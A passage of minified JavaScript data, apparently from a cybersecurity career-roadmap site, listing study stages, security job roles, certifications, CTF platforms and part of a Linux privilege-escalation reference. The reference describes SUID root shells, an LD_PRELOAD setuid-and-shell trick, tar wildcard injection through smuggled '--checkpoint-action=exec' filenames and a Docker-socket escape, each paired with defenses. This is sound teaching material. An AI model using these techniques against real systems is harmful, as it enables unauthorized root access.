(BPF)"],handsOnLabs:[{platform:"TryHackMe",name:"Network Fundamentals & Wireshark: The Basics",url:"https://tryhackme.com"},{platform:"HackTheBox Academy",name:"Introduction to Networking & Traffic Analysis",url:"https://academy.hackthebox.com"},{platform:"Malware-Traffic-Analysis.net",name:"Brad Duncan's Real-World PCAP Forensics Exercises",url:"https://www.malware-traffic-analysis.net"}],recommendedTools:["Wireshark","Tcpdump","Zeek","Nmap"]},{id:"node-scripting",code:"1.4",title:"Security Scripting & Automation (Python, Bash, Go)",subtitle:"Sockets, REST APIs, Log Parsing, Regular Expressions & Concurrency",estimatedHours:"45 hrs",difficulty:"Foundational",whyItMatters:"Manual security does not scale. Writing custom Python or Go tools to parse 10GB JSON logs, query threat intel APIs, or craft custom exploit PoCs is a core force multiplier.",topicsToMaster:["Python for Security: `requests`, `socket`, `scapy` packet crafting, `cryptography`, `asyncio`, and `BeautifulSoup`","Parsing & correlating structured logs (JSONL, CSV, Syslog, EVTX XML) using Python and `jq`","Writing defensive Bash & PowerShell incident triage scripts for rapid live-response collection","Interacting with REST & GraphQL APIs (VirusTotal, Shodan, GitHub, AWS boto3) with rate-limiting and token security","Git version control hygiene and preventing secret leaks with pre-commit hooks (`gitleaks`)"],handsOnLabs:[{platform:"picoCTF",name:"Python Scripting & Cryptography Automation Challenges",url:"https://picoctf.org"},{platform:"TryHackMe",name:"Python for Pentesters & SOC Automation",url:"https://tryhackme.com"},{platform:"Cryptopals",name:"Set 1: Basics of Hex, Base64 & XOR in Python",url:"https://cryptopals.com"}],recommendedTools:["CyberChef","Gitleaks","Impacket"]}]},{id:"stage-2",stageNumber:"STAGE 02",title:"Core Security & Cryptography Engineering",timeline:"Months 4–6 // Architectural & Analytical Mastery",accent:"emerald",description:"Transition from general IT engineering into adversarial thinking, cryptographic architectures, enterprise defense frameworks (NIST CSF 2.0 & MITRE ATT&CK), and hands-on vulnerability mechanics.",nodes:[{id:"node-sec-principles",code:"2.1",title:"Zero Trust Architecture, IAM & Access Models",subtitle:"NIST 800-207, CIA/AIC Triad, Kerberos, OAuth 2.0/OIDC & FIDO2 Passkeys",estimatedHours:"40 hrs",difficulty:"Intermediate",whyItMatters:"Identity is the modern perimeter. Over 80% of breaches involve compromised credentials, OAuth tokens, or Active Directory privilege escalation rather than binary zero-days.",topicsToMaster:["CIA Triad vs OT AIC Priority Inversion, Defense-in-Depth, Least Privilege, and Separation of Duties","Zero Trust Architecture (NIST SP 800-207): Policy Engine (PE), Policy Administrator (PA), and Policy Enforcement Point (PEP)","Access Control Models: Discretionary (DAC), Mandatory (MAC), Role-Based (RBAC), and Attribute-Based (ABAC)","Active Directory & Kerberos 5 Ticket Lifecycle (`AS-REQ`, `AS-REP`, TGT, `TGS-REQ`, `TGS-REP`, SPNs, Kerberoasting)","Modern Federation: SAML 2.0, OAuth 2.0 (Authorization Code + PKCE vs Device Code risks), OIDC JWTs, and FIDO2/WebAuthn"],handsOnLabs:[{platform:"TryHackMe",name:"Attacking & Defending Active Directory / Kerberos",url:"https://tryhackme.com"},{platform:"PortSwigger Web Academy",name:"OAuth 2.0 Authentication & JWT Vulnerabilities",url:"https://portswigger.net/web-security"},{platform:"HackTheBox",name:"Active Directory 101 Track (Forest, Sauna, Monteverde)",url:"https://hackthebox.com"}],recommendedTools:["BloodHound CE","NetExec (nxc)","Impacket"]},{id:"node-cryptography",code:"2.2",title:"Applied Cryptography, PKI & Data Resilience",subtitle:"AES-GCM, RSA/ECC, Post-Quantum ML-KEM, Argon2id, TLS 1.3 & WORM Backups",estimatedHours:"45 hrs",difficulty:"Intermediate",whyItMatters:"Misconfigured cryptography—such as ECB mode, static IVs, unauthenticated CBC (Padding Oracle), or weak password hashing—destroys confidentiality and integrity guarantees.",topicsToMaster:["Symmetric Encryption: AES-256-GCM (Authenticated Encryption with Associated Data - AEAD) and ChaCha20-Poly1305","Asymmetric Cryptography: RSA-OAEP, Elliptic Curve (ECDHE / Ed25519), and NIST Post-Quantum (FIPS 203 ML-KEM / Kyber)","Cryptographic Hashing & Password Storage: SHA-256/SHA-3, HMAC, Salting, and Memory-Hard KDFs (`Argon2id`, `bcrypt`, `PBKDF2`)","Public Key Infrastructure (PKI): Root/Intermediate CAs, X.509 Certificates, CRL/OCSP, mTLS, and TLS 1.3 ECDHE Perfect Forward Secrecy","Anti-Ransomware Data Resilience: The 3-2-1-1-0 WORM (Write-Once-Read-Many) Immutable & Air-Gapped Backup Rule"],handsOnLabs:[{platform:"Cryptopals",name:"Cryptopals Crypto Challenges Sets 1–3",url:"https://cryptopals.com"},{platform:"CryptoHack",name:"Interactive Modern Cryptography & TLS Puzzles",url:"https://cryptohack.org"},{platform:"picoCTF",name:"RSA, AES-CBC & Hashing Exploitation Track",url:"https://picoctf.org"}],recommendedTools:["Hashcat","John the Ripper","CyberChef"]},{id:"node-frameworks-attck",code:"2.3",title:"MITRE ATT&CK, NIST CSF 2.0 & Threat Modeling",subtitle:"TTPs, Pyramid of Pain, Cyber Kill Chain, Diamond Model & STRIDE",estimatedHours:"35 hrs",difficulty:"Intermediate",whyItMatters:"Frameworks translate raw packet bytes and hex dumps into structured adversary campaigns and actionable engineering priorities.",topicsToMaster:["NIST Cybersecurity Framework (CSF) 2.0 Six Core Functions: Govern, Identify, Protect, Detect, Respond, Recover","MITRE ATT&CK Matrix (Enterprise, ICS, Cloud) & MITRE ATLAS (Adversarial Threat Landscape for AI Systems)","David Bianco's Pyramid of Pain: Why hunting Behavioral TTPs beats chasing ephemeral Hash/IP Indicators","Lockheed Martin Cyber Kill Chain vs The Diamond Model of Intrusion Analysis (Adversary, Infrastructure, Capability, Victim)","Architectural Threat Modeling: STRIDE (Spoofing, Tampering, Repudiation, Info Disclosure, DoS, Elevation of Privilege) & DFD diagrams"],handsOnLabs:[{platform:"MITRE Defender",name:"MITRE ATT&CK Navigator & Threat Mapping Lab",url:"https://attack.mitre.org"},{platform:"TryHackMe",name:"Threat Intelligence Tools, MITRE & Pyramid of Pain",url:"https://tryhackme.com"},{platform:"CyberDefenders",name:"BlueYard Threat Intel & ATT&CK Mapping Challenges",url:"https://cyberdefenders.org"}],recommendedTools:["OpenCTI","MISP Threat Sharing","TheHive & Cortex"]},{id:"node-web-owasp",code:"2.4",title:"Web AppSec, OWASP Top 10 & Exploitation Mechanics",subtitle:"SQLi, XSS, SSRF, IDOR/BOLA, Deserialization & Command Injection",estimatedHours:"60 hrs",difficulty:"Intermediate",whyItMatters:"Web applications and APIs are the primary public-facing attack surface of every modern enterprise. Understanding both how exploits work and how parameterized code stops them is foundational.",topicsToMaster:["Complete OWASP Top 10 (A01 Broken Access Control through A10 Server-Side Request Forgery) & OWASP API Security Top 10","Injection Mechanics & Remediation: SQL Injection (Union/Blind -> Parameterized Prepared Statements) & OS Command Injection","Cross-Site Scripting (Reflected, Stored, DOM XSS), CSRF (SameSite Cookies), and Content Security Policy (CSP)","Server-Side Request Forgery (SSRF) to Cloud Metadata (AWS `169.254.169.254`) and defense via IMDSv2 session tokens","Insecure Deserialization, Path Traversal / Zip-Slip (`../`), and HTTP Request Smuggling / Brotli stream parsing flaws"],handsOnLabs:[{platform:"PortSwigger Web Academy",name:"SQLi, SSRF, XSS, XXE & Access Control Interactive Labs (Free)",url:"https://portswigger.net/web-security"},{platform:"OWASP Juice Shop",name:"Local Docker Deployment & Scoreboard Challenge",url:"https://owasp.org/www-project-juice-shop/"},{platform:"HackTheBox",name:"Starting Point & Web App Pentesting Track",url:"https://hackthebox.com"}],recommendedTools:["OWASP ZAP (Zed Attack Proxy)","SQLmap","Ffuf (Fuzz Faster U Fool)","Semgrep OSS"]}]},{id:"stage-3",stageNumber:"STAGE 03",title:"Specialized Principal Career Tracks",timeline:"Years 1–5+ // Domain Specialization & Principal Architecture",accent:"crimson",description:"Choose your primary specialization while retaining cross-domain fluency across Defensive SOC/DFIR, Offensive Red Teaming, Cloud/DevSecOps/AI Engineering, or Executive GRC Leadership.",nodes:[{id:"node-track-blueteam",code:"3.1",title:"🛡️ Blue Team: SOC, Detection Engineering & DFIR",subtitle:"SIEM/XDR, Sigma/YARA/Suricata Rules, Memory Forensics & Malware Reversing",estimatedHours:"120+ hrs",difficulty:"Advanced Specialization",whyItMatters:"Defensive engineers stand on the front lines of active intrusions—hunting stealthy Living-off-the-Land (LOLBins) actors, writing high-signal detection rules, and containing ransomware before encryption.",topicsToMaster:["SIEM & XDR Engineering: Deploying Wazuh / Security Onion 3, writing KQL/SPL queries, and reducing alert fatigue","Detection-as-Code: Authoring production Sigma rules (process creation), Suricata IDS signatures, and YARA-X malware rules","Windows Endpoint Forensics: Sysmon Event IDs (1, 3, 8, 10, 11, 22), Security Event IDs (4624, 4625, 4688, 4697, 4720), and Hayabusa timelines","Memory & Disk Forensics: Volatility 3 RAM analysis (`malfind`, `pslist`, `netscan`), NTFS `$MFT`/`$UsnJrnl` carving with Autopsy","Reverse Engineering & Malware Triage: Static/Dynamic analysis using Ghidra, CAPA, and CAPEv2 sandboxes"],handsOnLabs:[{platform:"CyberDefenders",name:"SOC Analyst & DFIR Blue Team CTF Challenges",url:"https://cyberdefenders.org"},{platform:"TryHackMe",name:"SOC Level 1 & SOC Level 2 Career Paths",url:"https://tryhackme.com"},{platform:"HackTheBox Sherlocks",name:"Real-World DFIR Incident Investigation Scenarios",url:"https://hackthebox.com"}],recommendedTools:["Wazuh SIEM & XDR","Security Onion 3","Velociraptor (Rapid7 OSS)","Volatility 3","Ghidra (NSA SRE)","Hayabusa (Yamato Security)"]},{id:"node-track-redteam",code:"3.2",title:"⚔️ Red Team: Offensive Security, AD & Exploit Dev",subtitle:"Enterprise AD Exploitation, C2 Infrastructure, EDR Evasion & 0-Day Fuzzing",estimatedHours:"120+ hrs",difficulty:"Advanced Specialization",whyItMatters:"Authorized offensive operators emulate real-world APT adversaries to uncover chained architectural blind spots and validate whether blue team detections fire under realistic stealth conditions.",topicsToMaster:["External Recon & Initial Access: OSINT (Amass, SpiderFoot), web/API exploitation, and Adversary-in-the-Middle (AitM) phishing","Active Directory Domination: Kerberoasting, AS-REP Roasting, Unconstrained/Constrained/RBCD Delegation, AD CS (ESC1–ESC13), and DCSync","Command & Control (C2) Engineering: Sliver / Havoc deployment, redirectors, domain fronting, and malleable HTTP profiles","EDR Telemetry Evasion: Direct/Indirect System Calls, Process Hollowing, API Unhooking, Sleep Obfuscation, and BOFs (Beacon Object Files)","Vulnerability Research & Fuzzing: Coverage-guided fuzzing (AFL++, LibFuzzer), heap exploitation, and binary diffing"],handsOnLabs:[{platform:"HackTheBox Pro Labs",name:"Zephyr, RastaLabs & Offshore Enterprise AD Labs",url:"https://hackthebox.com"},{platform:"GOAD (Game of Active Directory)",name:"Self-Hosted Multi-Forest Vulnerable AD Lab",url:"https://github.com/Orange-Cyberdefense/GOAD"},{platform:"PortSwigger & Pwn.college",name:"Advanced Web Exploitation & Binary Exploitation Dojos",url:"https://pwn.college"}],recommendedTools:["BloodHound CE","Impacket","NetExec (nxc / CrackMapExec)","Sliver C2 (Bishop Fox)","Metasploit Framework","Nuclei (ProjectDiscovery)"]},{id:"node-track-cloud-ai-ot",code:"3.3",title:"☁️ Cloud, DevSecOps, AI/LLM & OT Architecture",subtitle:"AWS/K8s Hardening, CI/CD Supply Chain, OWASP LLM Top 10 & ICS Purdue Model",estimatedHours:"120+ hrs",difficulty:"Advanced Specialization",whyItMatters:"Modern principal security architects secure ephemeral cloud-native Kubernetes clusters, automated CI/CD pipelines, autonomous AI agents, and cyber-physical industrial grids.",topicsToMaster:["Cloud Security (AWS/Azure/GCP): IAM Least Privilege, IMDSv2 enforcement, VPC PrivateLink, CSPM (Prowler), and CloudTrail hunting","Kubernetes & Container Security: Distroless/non-root Dockerfiles, Pod Security Standards, NetworkPolicies, and eBPF Falco runtime defense","DevSecOps & Supply Chain (SLSA): Automated SAST (Semgrep), SCA/SBOM (Trivy), IaC scanning (Checkov), and Cosign artifact signing","AI & LLM Security: Defending RAG & Autonomous Agents against Indirect Prompt Injection, Context Compaction Poisoning, and Pickle RCE (Safetensors)","OT / ICS Critical Infrastructure: Purdue Model (Levels 0–5 + IDMZ), Data Diodes, and passive Modbus/DNP3/S7comm inspection (CISA Malcolm)"],handsOnLabs:[{platform:"flAWS.cloud & flAWS2.cloud",name:"Hands-On AWS Cloud Security Exploitation & Defense Labs",url:"http://flaws.cloud"},{platform:"Kubernetes Goat",name:"Interactive Vulnerable Kubernetes Cluster Security Playground",url:"https://madhuakula.com/kubernetes-goat/"},{platform:"Gandalf by Lakera",name:"Interactive AI Prompt Injection & Guardrail Lab",url:"https://gandalf.lakera.ai"}],recommendedTools:["Prowler Cloud Security","Falco (CNCF Graduated)","Checkov (Bridgecrew/Palo Alto)","Trivy (Aqua Security)","Garak (NVIDIA LLM Vulnerability Scanner)","CISA Malcolm"]},{id:"node-track-grc-ciso",code:"3.4",title:"⚖️ GRC, Risk Quantification & Executive CISO Leadership",subtitle:"NIST CSF 2.0, ISO 27001, SOC 2 Type II, FAIR Risk Modeling & Crisis Governance",estimatedHours:"90+ hrs",difficulty:"Executive & Governance Track",whyItMatters:"Technical controls fail without organizational governance, board budget alignment, regulatory compliance, and third-party supply-chain accountability.",topicsToMaster:["Operationalizing NIST CSF 2.0: Mapping the Govern (GV) function across enterprise risk registers and board reporting","Audit & Regulatory Frameworks: ISO/IEC 27001:2022, SOC 2 Type II Trust Services Criteria, PCI-DSS v4.0, HIPAA, GDPR, and SEC Cyber Rules","Quantitative Risk Analysis (FAIR Model): Calculating Annualized Loss Expectancy (ALE) in financial terms for board investment","Third-Party Risk Management (TPRM): Auditing SaaS vendors, requiring signed CycloneDX SBOMs, and M&A security due diligence","Executive Crisis Management: Running ransomware tabletop exercises, cyber insurance negotiation, and legal breach notification"],handsOnLabs:[{platform:"NIST CSRC",name:"NIST CSF 2.0 Organizational Profile & Implementation Tiers Workshop",url:"https://www.nist.gov/cyberframework"},{platform:"CISA Tabletop Exercise Packages (CTEP)",name:"Executive Ransomware & ICS Crisis Simulation Scenarios",url:"https://www.cisa.gov/cisa-tabletop-exercise-packages"},{platform:"FAIR Institute",name:"Quantitative Cyber Risk Scenarios",url:"https://www.fairinstitute.org"}],recommendedTools:["Prowler Cloud Security","OpenCTI","OWASP Dependency-Check"]}]}],a=[{id:"blue-team",label:"🛡️ Blue Team (Defensive & SOC)",roles:[{title:"SOC Analyst (Tier 1 / Tier 2)",level:"Entry to Mid (0–3 yrs)",compRange:"$75k – $115k",responsibilities:"Triage SIEM/XDR alerts in real time, analyze phishing payloads and email headers, inspect network PCAPs, and execute initial host containment.",skills:["SIEM (Wazuh/Splunk/Sentinel)","Wireshark & TCP/IP","EDR Triage","Windows & Linux Event Logs","Phishing Header Forensics"],certs:["CompTIA Security+ (SY0-701)","BTL1 (Blue Team Level 1)","CompTIA CySA+","GIAC GSEC"]},{title:"Incident Responder / DFIR Specialist",level:"Mid to Senior (3–6 yrs)",compRange:"$120k – $175k",responsibilities:"Lead active breach containment, acquire and analyze volatile RAM and NTFS disk images, reverse-engineer malware persistence, and coordinate root-cause eradication.",skills:["Volatility 3 (RAM Forensics)","Velociraptor (VQL)","Autopsy / $MFT Timeline","Hayabusa / Chainsaw","YARA-X & Ransomware Recovery"],certs:["GIAC GCIH","GIAC GCFA","BTL2","CompTIA CySA+"]},{title:"Cyber Threat Intelligence (CTI) Analyst",level:"Mid (2–5 yrs)",compRange:"$110k – $160k",responsibilities:"Track nation-state APT clusters and ransomware syndicates, map adversary TTPs to MITRE ATT&CK, manage STIX/TAXII feeds, and deliver executive threat briefings.",skills:["MITRE ATT&CK & Diamond Model","OpenCTI & MISP","YARA Rule Authoring","OSINT (SpiderFoot / Maltego)","Dark Web & DNS Pivot Analysis"],certs:["GIAC GCTI","CompTIA CySA+","CREST CCTIM"]},{title:"Detection Engineer / Threat Hunter",level:"Senior (4–8 yrs)",compRange:"$145k – $210k",responsibilities:"Build Detection-as-Code pipelines, write custom Sigma/Suricata/YARA rules, and proactively hunt for stealthy Living-off-the-Land (LOLBins) intrusions bypassing automated alerts.",skills:["Sigma, Suricata & Zeek Scripting","KQL / SPL / EQL Query Engineering","Sysmon & Kernel ETW Telemetry","CI/CD Detection Testing","Python Automation"],certs:["GIAC GCIA","GIAC GCFA","OffSec OSDA","CompTIA SecurityX (CAS-005)"]}]},{id:"red-team",label:"⚔️ Red Team (Offensive & Pentesting)",roles:[{title:"Penetration Tester (Network & Web)",level:"Mid (2–5 yrs)",compRange:"$115k – $165k",responsibilities:"Conduct authorized external/internal network, web application, API, and wireless penetration tests; chain vulnerabilities and author actionable remediation reports.",skills:["Nmap & Network Recon","OWASP ZAP / Burp Suite","Active Directory (BloodHound / Impacket / NetExec)","SQLi / SSRF / IDOR","Python / Bash Scripting"],certs:["OffSec OSCP","HTB CPTS","TCM PNPT","CompTIA PenTest+"]},{title:"Red Team Operator / Adversary Emulation",level:"Senior (4–8+ yrs)",compRange:"$150k – $225k",responsibilities:"Execute full-scope, multi-month stealth adversary simulations against blue teams; develop custom C2 infrastructure, evade EDR kernel hooks, and lead Purple Team exercises.",skills:["C2 Frameworks (Sliver / Havoc / Cobalt Strike)","EDR Evasion & Indirect Syscalls","C / C# / Rust / Go Implant Dev","Active Directory Kerberos & AD CS Abuse","AiTM Social Engineering"],certs:["OffSec OSEP","Zero-Point CRTO","CREST CRT","GIAC GPEN"]},{title:"Vulnerability Researcher & Exploit Developer",level:"Senior / Principal (5–10+ yrs)",compRange:"$180k – $300k+",responsibilities:"Discover 0-day memory corruption and logic vulnerabilities in OS kernels, hypervisors, browsers, and embedded firmware; build deterministic PoCs and binary hardening mitigations.",skills:["x86_64 & ARM64 Assembly","Ghidra / IDA Pro / WinDbg","Coverage-Guided Fuzzing (AFL++ / LibFuzzer)","Heap & Kernel Pool Exploitation","Source Code Auditing (C/C++/Rust)"],certs:["OffSec OSED","OffSec OSEE","GIAC GXPN"]}]},{id:"engineering",label:"🏗️ Cloud, AppSec, AI & OT Engineering",roles:[{title:"Cloud Security Engineer",level:"Mid to Senior (3–7 yrs)",compRange:"$140k – $205k",responsibilities:"Architect secure AWS, Azure, and GCP environments; enforce least-privilege IAM/CIEM, harden Kubernetes clusters, and automate CSPM and Infrastructure-as-Code guardrails.",skills:["AWS / Azure / GCP IAM & Networking","Terraform / OpenTofu & Checkov","Kubernetes & Docker Hardening","Prowler CSPM & Falco eBPF","IMDSv2 & Workload OIDC"],certs:["AWS Certified Security - Specialty","Microsoft AZ-500","ISC2 CCSP","CNCF CKS (Certified Kubernetes Security)"]},{title:"Application Security (AppSec) / DevSecOps Engineer",level:"Mid to Senior (3–7 yrs)",compRange:"$145k – $215k",responsibilities:"Embed automated SAST, DAST, SCA, and secret scanning into CI/CD pipelines; perform architectural threat modeling, secure code reviews, and SBOM supply-chain governance.",skills:["Semgrep SAST & Trivy SCA/SBOM","Gitleaks / TruffleHog","Secure Coding (Python, Go, TypeScript, Java)","OWASP Top 10 & API Security","GitHub Actions / GitLab CI Security"],certs:["CompTIA SecurityX (CAS-005)","OffSec OSWE","ISC2 CSSLP","GIAC GWEB"]},{title:"AI & LLM Security Engineer",level:"Mid to Senior (3–7 yrs)",compRange:"$165k – $260k+",responsibilities:"Secure enterprise Large Language Models, RAG vector pipelines, and autonomous AI agents against direct/indirect prompt injection, context poisoning, and model supply-chain compromises.",skills:["OWASP LLM Top 10 & MITRE ATLAS","Garak, Promptfoo & Microsoft PyRIT","Permission-Aware RAG & Vector DB ACLs","Agent Tool-Call Sandboxing","Safetensors & PyTorch Security"],certs:["CompTIA SecurityX (CAS-005)","GIAC GMLE","AWS / Cloud AI Security"]},{title:"OT / ICS Critical Infrastructure Security Engineer",level:"Mid to Senior (3–8 yrs)",compRange:"$135k – $195k",responsibilities:"Defend electrical substations, water treatment plants, and manufacturing lines; architect Purdue Model segmentation, Industrial DMZs, Data Diodes, and passive ICS network monitoring.",skills:["Purdue Model (Levels 0–5 & IDMZ)","Modbus/TCP, DNP3, S7comm & OPC UA","CISA Malcolm & Zeek ICSNPP","ISA/IEC 62443 & NERC CIP","PLC & HMI Hardening"],certs:["GIAC GICSP","GIAC GRID","ISA/IEC 62443 Cybersecurity Expert"]},{title:"Principal Security Architect",level:"Principal (7–12+ yrs)",compRange:"$195k – $310k+",responsibilities:"Design enterprise-wide Zero Trust blueprints (NIST 800-207), cryptographic PKI hierarchies, post-quantum migration roadmaps, and resilient multi-cloud defense-in-depth architectures.",skills:["Zero Trust Architecture (NIST 800-207)","Enterprise PKI, HSMs & Post-Quantum Crypto","Cross-Domain Threat Modeling","M&A Security Integration","NIST CSF 2.0 Technical Governance"],certs:["CompTIA SecurityX (CAS-005)","CISSP-ISSAP","SABSA Chartered Security Architect"]}]},{id:"grc-leadership",label:"⚖️ GRC, Privacy & Executive Leadership",roles:[{title:"GRC & Third-Party Risk (TPRM) Analyst",level:"Entry to Mid (1–4 yrs)",compRange:"$85k – $130k",responsibilities:"Lead internal compliance audits, execute third-party SaaS/vendor risk assessments, maintain enterprise risk registers, and map controls to NIST CSF 2.0, SOC 2, and ISO 27001.",skills:["NIST CSF 2.0 & NIST SP 800-53","ISO/IEC 27001 & SOC 2 Type II","PCI-DSS v4.0, HIPAA & GDPR","Vendor SBOM & Security Questionnaires","Risk Register Management"],certs:["ISACA CISA","CompTIA Security+ (SY0-701)","ISACA CRISC","ISO 27001 Lead Auditor"]},{title:"Information Security Manager / Director",level:"Senior (5–9 yrs)",compRange:"$155k – $220k",responsibilities:"Manage SOC and security engineering teams, oversee security budgets, lead incident response tabletop exercises, and translate technical risk into operational roadmaps.",skills:["Security Program Governance","Incident Response Management","Budget & Vendor Consolidation","Disaster Recovery / BCP Planning","Metrics & KPI Reporting"],certs:["ISACA CISM","ISC2 CISSP","EC-Council CCISO"]},{title:"Chief Information Security Officer (CISO)",level:"Executive (10–15+ yrs)",compRange:"$240k – $450k+",responsibilities:"Align global cybersecurity strategy with Board of Directors business objectives, manage SEC/regulatory liability, lead crisis response, and drive organizational security culture.",skills:["Board & Executive Communication","FAIR Quantitative Risk Modeling","SEC / Regulatory Compliance & Legal","M&A Cyber Due Diligence","Enterprise Crisis Leadership"],certs:["ISC2 CISSP","ISACA CISM","ISACA CRISC","CompTIA SecurityX (CAS-005)"]}]}],i=[{tier:"Tier 1: Foundational (0–2 Years)",badgeColor:"cyan",comptia:["CompTIA A+","CompTIA Network+","CompTIA Security+ (SY0-701)"],isc2_isaca:["ISC2 CC (Certified in Cybersecurity)","ISACA ITCA"],offsec_practical:["eJPT (INE)","TryHackMe SAL1","Security Blue Team BTL1"],giac:["GIAC GFACT","GIAC GSEC"]},{tier:"Tier 2: Intermediate / Specialist (2–5 Years)",badgeColor:"emerald",comptia:["CompTIA CySA+ (CS0-003)","CompTIA PenTest+","CompTIA Cloud+"],isc2_isaca:["ISC2 SSCP","ISACA CISA (Auditor)","ISACA CRISC"],offsec_practical:["OffSec OSCP","HTB CPTS","TCM PNPT","Zero-Point CRTO","OffSec OSDA"],giac:["GIAC GCIH (Incident Handler)","GIAC GCIA (Intrusion Analyst)","GIAC GPEN","GIAC GICSP (ICS/OT)"]},{tier:"Tier 3: Advanced / Principal / Executive (5–10+ Years)",badgeColor:"crimson",comptia:["CompTIA SecurityX (CAS-005) [Formerly CASP+]"],isc2_isaca:["ISC2 CISSP","ISACA CISM","ISC2 CCSP (Cloud)","CISSP-ISSAP"],offsec_practical:["OffSec OSEP (Evasion)","OffSec OSWE (Web)","OffSec OSED (Exploit Dev)","OffSec OSEE"],giac:["GIAC GCFA (Forensics)","GIAC GXPN (Exploit Researcher)","GIAC GCTI","GIAC GSTRT"]}],r={title:"CompTIA SecurityX (CAS-005) — Principal Architect Standard",subtitle:"CompTIA retired the CASP+ (CAS-004) brand to launch SecurityX (CAS-005), the premier hands-on technical certification for Senior Security Architects and Principal Engineers (whereas CISSP focuses on management decisions, SecurityX tests hands-on architecture implementation).",specs:[{label:"Official Exam Code",value:"CAS-005"},{label:"Question Format",value:"Max 90 Questions (Performance-Based PBQs + Linux/Cloud Simulations + MCQs)"},{label:"Exam Duration",value:"165 Minutes (2 Hours 45 Minutes)"},{label:"Scoring Model",value:"Pass / Fail Only (No Scaled Numerical Score Reported)"},{label:"Target Experience",value:"10+ Years IT Administration including 5+ Years Hands-On Technical Security"},{label:"ISO / DoD Alignment",value:"DoD 8140 / 8570 IAT Level III & IAM Level III Approved"}],domains:[{name:"1.0 Governance, Risk, and Compliance (GRC)",weight:20,color:"#f59e0b",focus:"NIST CSF 2.0 Govern function, quantitative risk modeling (FAIR), supply-chain SBOM verification, regulatory frameworks, and cryptographic policy governance."},{name:"2.0 Security Architecture",weight:27,color:"#00f0ff",focus:"Zero Trust network design (NIST 800-207), multi-cloud & hybrid workload isolation, de-perimeterization, software supply chain security, and ICS/SCADA Purdue segmentation."},{name:"3.0 Security Engineering",weight:31,color:"#00ff66",focus:"Post-Quantum Cryptography (ML-KEM / ML-DSA), PKI/HSM lifecycle, endpoint kernel hardening, secure CI/CD pipelines, container/Kubernetes hardening, and AI/LLM security controls."},{name:"4.0 Security Operations",weight:22,color:"#ff3366",focus:"SOAR automation, advanced threat hunting, Suricata/Sigma/YARA rule engineering, volatile memory forensics, and enterprise breach containment."}]},n=[{name:"CTFtime.org",category:"Global CTF Calendar & Writeup Archive",level:"All Tiers",url:"https://ctftime.org",desc:"The official global directory of upcoming Jeopardy & Attack-Defense CTF competitions, team rankings, and thousands of technical exploit writeups."},{name:"pwnable.kr",category:"Binary Exploitation & Linux Internals",level:"Beginner → Advanced",url:"https://pwnable.kr",desc:"Premier SSH-based system exploitation wargame (Toddler's Bottle to Rookiss) covering file descriptors, BOF, UAF, format strings, and syscall internals."},{name:"pwnable.tw",category:"Advanced Heap & Kernel Exploitation",level:"Advanced / Expert",url:"https://pwnable.tw",desc:"High-difficulty binary exploitation challenges testing glibc heap internals (tcache/fastbins), ROP chains, seccomp bypasses, and ELF reverse engineering."},{name:"OverTheWire (Bandit / Natas)",category:"Linux CLI, PrivEsc & Web Security",level:"Foundational",url:"https://overthewire.org/wargames/",desc:"Hands-on SSH wargames teaching Linux permissions, SUID binaries, cron jobs, Git history forensics, and web server logic flaws from first principles."},{name:"HackTheBox (Labs & Pro Labs)",category:"Active Directory, Red Team & SOC",level:"Intermediate → Expert",url:"https://www.hackthebox.com",desc:"Full-scale vulnerable Linux/Windows machines, Enterprise Active Directory Pro Labs (Zephyr, RastaLabs), and Sherlock DFIR blue-team investigations."},{name:"TryHackMe",category:"Guided Red/Blue/SOC Career Paths",level:"Foundational → Intermediate",url:"https://tryhackme.com",desc:"Browser-based interactive labs for SOC Level 1/2, Junior Penetration Tester, Linux/Windows Privilege Escalation, and CompTIA Security+ prep."},{name:"picoCTF (CMU)",category:"Reverse Engineering, Crypto & Forensics",level:"Foundational → Intermediate",url:"https://picoctf.org",desc:"Carnegie Mellon University's year-round picoGym featuring 400+ challenges across Binary Exploitation, Cryptography, Web, and Memory Forensics."},{name:"CyberDefenders & LetsDefend",category:"Blue Team DFIR, SIEM & PCAP Triage",level:"Intermediate",url:"https://cyberdefenders.org",desc:"Defensive SOC challenges using real Wireshark PCAPs, Volatility memory dumps, Splunk/ELK SIEM logs, and Velociraptor endpoint artifacts."}],o=[{id:"linux-privesc",label:"🐧 Linux Internals & PrivEsc",subtitle:"SUID, Capabilities, Sudoers/LD_PRELOAD, Cron Wildcards, Namespaces & Kernel Hardening",items:[{vector:"SUID / SGID Binaries & GTFOBins",mechanism:"Binaries with the SUID bit (`-rwsr-xr-x`, octal `4000`) execute with the effective UID (`euid=0`) of the file owner (root). If `find`, `vim`, `python3`, `bash`, or a custom binary calling `system()` without an absolute path has SUID set, an unprivileged user spawns an instant root shell.",enumCli:"find / -perm -4000 -type f -ls 2>/dev/null",defense:"Mount user-writable partitions (`/tmp`, `/home`, `/dev/shm`) with `nosuid,nodev,noexec` in `/etc/fstab` and audit SUID binaries via `auditd`."},{vector:"Linux POSIX Capabilities (`cap_setuid`, `cap_dac_read_search`)",mechanism:"Capabilities break root privileges into granular kernel bits. Even without an SUID bit, a binary granted `cap_setuid+ep` (e.g., `/usr/bin/python3`) or `cap_dac_read_search+ep` (e.g., `/usr/bin/tar`) can call `os.setuid(0)` or read `/etc/shadow` directly.",enumCli:"getcap -r / 2>/dev/null",defense:"Strip unnecessary file capabilities with `setcap -r <binary>` and restrict container capabilities using Docker `--cap-drop=ALL`."},{vector:"Sudoers Misconfigurations & `LD_PRELOAD` Hijacking",mechanism:'If `/etc/sudoers` grants `NOPASSWD` on interpreters/utilities or preserves `env_keep+=LD_PRELOAD`, an attacker compiles a shared object (`.so`) overriding `_init()` to call `setuid(0); system("/bin/bash");` before the target binary even runs.',enumCli:"sudo -l && cat /etc/ld.so.preload 2>/dev/null",defense:"Never allow `env_keep+=LD_PRELOAD` in `/etc/sudoers`, enforce full argument matching, and require `Defaults use_pty`."},{vector:"Cron Job PATH Hijacking & `tar` Wildcard Injection",mechanism:"Root cron jobs executing `tar czf /backups/html.tgz *` inside a world-writable folder expand filenames starting with `--checkpoint=1` and `--checkpoint-action=exec=sh shell.sh` as CLI flags instead of file names.",enumCli:"cat /etc/crontab; ls -la /etc/cron* /var/spool/cron/crontabs 2>/dev/null",defense:"Always prefix wildcards with `./*` (`tar czf backup.tgz ./*`) and ensure root cron scripts are owned `root:root` (`chmod 700`)."},{vector:"Docker Socket (`/var/run/docker.sock`) & Namespace Escape",mechanism:"Membership in the `docker` group or write access to `/var/run/docker.sock` is equivalent to root on the host: mounting the host root filesystem (`-v /:/mnt --privileged`) allows editing `/mnt/etc/shadow` directly.",enumCli:"id; ls -la /var/run/docker.sock; grep 